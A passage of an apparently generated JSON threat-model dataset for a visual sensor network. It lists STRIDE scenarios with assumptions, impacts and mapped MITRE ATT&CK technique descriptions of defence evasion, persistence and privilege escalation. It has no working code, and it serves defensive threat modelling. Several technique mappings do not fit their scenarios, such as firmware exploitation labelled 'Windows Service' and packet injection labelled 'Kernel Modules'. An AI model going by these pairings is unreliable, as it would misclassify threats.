                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting firmware vulnerabilities to gain higher access control.",
            "Assumptions": [
                {
                    "Assumption": "Firmware contains exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Firmware is not regularly updated."
                },
                {
                    "Assumption": "Physical access to devices.",
                    "Role": "Attacker",
                    "Condition": "Attacker can physically access the devices or administrative interfaces."
                }
            ],
            "Potential Impact": "Increased level of control, unauthorized configuration changes.",
            "MITRE ATT&CK Keywords": [
                "firmware exploitation",
                "privilege escalation",
                "device control",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using software bugs to elevate privileges within the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Presence of exploitable software bugs.",
                    "Role": "Attacker",
                    "Condition": "Existing unpatched software bugs."
                },
                {
                    "Assumption": "Ability to interact with the system's software.",
                    "Role": "Attacker",
                    "Condition": "Ability to execute commands or scripts on the software."
                }
            ],
            "Potential Impact": "Unauthorized access to restricted functionalities, potential data theft and manipulation.",
            "MITRE ATT&CK Keywords": [
                "software exploitation",
                "privilege escalation",
                "unauthorized access",
                "code execution"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--46944654-fcc1-4f63-9dad-628102376586",
                "technique_id": "T1038"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains admin access to the central server through RCE vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Remote Code Execution vulnerability exists.",
                    "Role": "Attacker",
                    "Condition": "Server runs vulnerable software."
                },
                {
                    "Assumption": "Knowledge of the exploit method.",
                    "Role": "Attacker",
                    "Condition": "Accessible and exploitable RCE vectors."
                }
            ],
            "Potential Impact": "Complete control over the system, major data compromise.",
            "MITRE ATT&CK Keywords": [
                "remote code execution",
                "admin access",
                "server control",
                "data compromise"
            ],
            "mitre_technique": {
                "name": "Remote Services",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)",
                "id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
                "technique_id": "T1021"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access by spoofing a legitimate user's identity to the visual sensor network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can capture network traffic and extract authentication credentials.",
                    "Role": "Attacker",
                    "Condition": "Network traffic is unencrypted or poorly encrypted."
                },
                {
                    "Assumption": "The attacker possesses tools to create spoofed credentials.",
                    "Role": "Attacker",
                    "Condition": "Availability of spoofing tools and information."
                },
                {
                    "Assumption": "System lacks multi-factor authentication.",
                    "Role": "System Admin",
                    "Condition": "Only single-factor authentication is implemented."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data confidentiality risks.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "Spoofing",
                "User Impersonation",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of legitimate camera nodes to inject false visual data into the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and read sensor data packets.",
                    "Role": "Attacker",
                    "Condition": "Network uses insecure communication protocols."
                },
                {
                    "Assumption": "The attacker can modify data packets to mimic legitimate sensor nodes.",
                    "Role": "Attacker",
                    "Condition": "Lack of integrity checks for sensor data."
                },
                {
                    "Assumption": "No robust sensor node authentication mechanism is in place.",
                    "Role": "System Admin",
                    "Condition": "Authentication between nodes is unimplemented or weak."
                }
            ],
            "Potential Impact": "Integrity of the visual data is compromised, leading to false information being processed.",
            "MITRE ATT&CK Keywords": [
                "Injection",
                "Spoofing",
                "Data Manipulation",
                "Sensor Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker utilizes DNS spoofing to redirect network traffic from the visual sensor network to a malicious server.",
            "Assumptions": [
                {
                    "Assumption": "DNS queries are not secured with DNSSEC.",
                    "Role": "System Admin",
                    "Condition": "DNSSEC is not implemented."
                },
                {
                    "Assumption": "The attacker has access to the network's DNS settings.",
                    "Role": "Attacker",
                    "Condition": "Weak network security practices."
                },
                {
                    "Assumption": "No verification of DNS responses' authenticity.",
                    "Role": "System Admin",
                    "Condition": "DNS verification mechanisms are absent."
                }
            ],
            "Potential Impact": "Confidentiality and integrity of data transmission are jeopardized.",
            "MITRE ATT&CK Keywords": [
                "DNS Spoofing",
                "Redirection",
                "Network Traffic",
                "MitM"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the firmware of visual sensor nodes to introduce malicious functionalities.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not signed or verified.",
                    "Role": "System Admin",
                    "Condition": "Firmware integrity checks are not enforced."
                },
                {
                    "Assumption": "Physical access to sensor nodes or unsecured remote update mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Physical/remote access is not properly restricted."
                },
                {
                    "Assumption": "Lack of monitoring for unexpected firmware changes.",
                    "Role": "System Admin",
                    "Condition": "No monitoring for firmware integrity or changes."
                }
            ],
            "Potential Impact": "Compromises data integrity, confidentiality, and availability.",
            "MITRE ATT&CK Keywords": [
                "Firmware Compromise",
                "Tampering",
                "Malicious Code",
                "Embedded Devices"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration settings of the visual sensor network to disrupt normal operations.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls for configuration settings.",
                    "Role": "System Admin",
                    "Condition": "Weak or no access controls."
                },
                {
                    "Assumption": "The attacker can escalate privileges or exploit configuration vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "System vulnerabilities are unpatched."
                },
                {
                    "Assumption": "Configuration changes are not logged or monitored.",
                    "Role": "System Admin",
                    "Condition": "Lack of logging and monitoring."
                }
            ],
            "Potential Impact": "Data availability is compromised, leading to service disruption.",
            "MITRE ATT&CK Keywords": [
                "Configuration Manipulation",
                "Tampering",
                "Service Disruption",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into data packets transmitted between camera nodes, altering captured visual data.",
            "Assumptions": [
                {
                    "Assumption": "No encryption or weak encryption of communication between nodes.",
                    "Role": "System Admin",
                    "Condition": "Transmission protocols lack strong encryption."
                },
                {
                    "Assumption": "The attacker has network access to intercept and modify packets.",
                    "Role": "Attacker",
                    "Condition": "Network access is insufficiently restricted."
                },
                {
                    "Assumption": "No integrity checks for packets.",
                    "Role": "System Admin",
                    "Condition": "Network protocols do not include integrity mechanisms."
                }
            ],
            "Potential Impact": "Compromises data integrity, leading to misinformation and potential misuse of altered visual data.",
            "MITRE ATT&CK Keywords": [
                "Packet Injection",
                "Tampering",
                "Network Manipulation",
                "Data Corruption"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending or altering data transmitted through the visual sensor network.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are inadequate or non-existent.",
                    "Role": "System Admin",
                    "Condition": "Log entries for user activities are not maintained."
                },
                {
                    "Assumption": "Users can manipulate log entries.",
                    "Role": "User/Attacker",
                    "Condition": "Logs can be altered without detection."
                },
                {
                    "Assumption": "System does not have digital signatures for data.",
                    "Role": "System Admin",
                    "Condition": "Digital signatures are not implemented for data authenticity."
                }
            ],
            "Potential Impact": "Difficulty in proving the source of data, leading to potential data integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Manipulation",
                "Activity Denial",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An internal user denies accessing sensitive visual data, claiming access rights breach.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access auditing.",
                    "Role": "System Admin",
                    "Condition": "Access logs are not adequately detailed."
                },
                {
                    "Assumption": "Users can access data without traceable logs.",
                    "Role": "User/Attacker",
                    "Condition": "Systems do not log all access events."
                },
                {
                    "Assumption": "Lack of digital proof of access rights.",
                    "Role": "System Admin",
                    "Condition": "Permissions and access rights are not digitally documented."
                }
            ],
            "Potential Impact": "Data integrity and confidentiality are compromised due to the challenge in tracking unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "Access Denial",
                "Repudiation",
                "Audit Failure",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A remote attacker triggers actions within the visual sensor network and later denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "Remote access logs are poorly maintained or easily modified.",
                    "Role": "System Admin",
                    "Condition": "Logging mechanisms are weak or nonexistent."
                },
                {
                    "Assumption": "Network activities can be performed anonymously or using spoofed credentials.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network security and authentication mechanisms."
                },
                {
                    "Assumption": "Actions are not tied to individual user activities.",
                    "Role": "System Admin",
                    "Condition": "System lacks mechanisms to link actions to specific users."
                }
            ],
            "Potential Impact": "Loss of data integrity and accountability, complicating forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "Action Denial",
                "Repudiation",
                "Forensic Evasion",
                "Remote Access"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits an XXE vulnerability to read sensitive local files from the visual sensor network system.",
            "Assumptions": [
                {
                    "Assumption": "System processes untrusted XML input without proper validation.",
                    "Role": "System Admin",
                    "Condition": "XXE vulnerabilities are present in the system."
                },
                {
                    "Assumption": "Attacker can send crafted XML payloads to the vulnerable system.",
                    "Role": "Attacker",
                    "Condition": "No input sanitization mechanisms are in place."
                },
                {
                    "Assumption": "The system's security settings allow unauthorized file access.",
                    "Role": "System Admin",
                    "Condition": "System security settings are misconfigured."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "XXE",
                "Information Disclosure",
                "File Read",
                "Input Validation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses a Command and Control (C2) domain to extract visual data from compromised nodes.",
            "Assumptions": [
                {
                    "Assumption": "Nodes can communicate with external servers.",
                    "Role": "System Admin",
                    "Condition": "Egress network traffic to C2 servers is not sufficiently restricted."
                },
                {
                    "Assumption": "Compromised nodes have no packet inspection or anomaly detection.",
                    "Role": "System Admin",
                    "Condition": "Lack of network monitoring and intrusion detection."
                },
                {
                    "Assumption": "Sensitive visual data is stored or transmitted insecurely.",
                    "Role": "System Admin",
                    "Condition": "Data encryption is not applied to sensitive data."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality due to unauthorized data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "C2",
                "Data Exfiltration",
                "Network Communication",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
                "technique_id": "T1029"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits directory traversal vulnerability to access restricted visual data files on the network.",
            "Assumptions": [
                {
                    "Assumption": "Web application on the network has directory traversal weaknesses.",
                    "Role": "System Admin",
                    "Condition": "Application vulnerabilities are unpatched."
                },
                {
                    "Assumption": "User inputs are not sanitized before processing.",
                    "Role": "Developer",
                    "Condition": "No input validation implemented."
                },
                {
                    "Assumption": "Sensitive files are not adequately protected by access controls.",
                    "Role": "System Admin",
                    "Condition": "Access controls are weak or misconfigured."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data, leading to confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "Directory Traversal",
                "File Access",
                "Information Disclosure",
                "Web Application"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
